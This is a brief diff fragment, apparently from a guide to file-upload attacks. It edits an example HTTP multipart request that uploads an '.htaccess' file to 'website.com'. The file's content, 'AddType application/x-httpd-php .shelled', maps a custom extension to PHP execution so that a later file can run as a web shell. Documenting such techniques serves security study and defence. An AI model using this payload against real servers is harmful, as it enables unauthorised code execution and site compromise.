@@ -155,7 +155,7 @@ Host: website.com
 Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216
 
 -----------------------------4829104394923874193918493216
-Content-Disposition: form-data; name="avatar"; filename="webshell.htaccess"
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
 Content-Type: plain/text
 
 AddType application/x-httpd-php .shelled
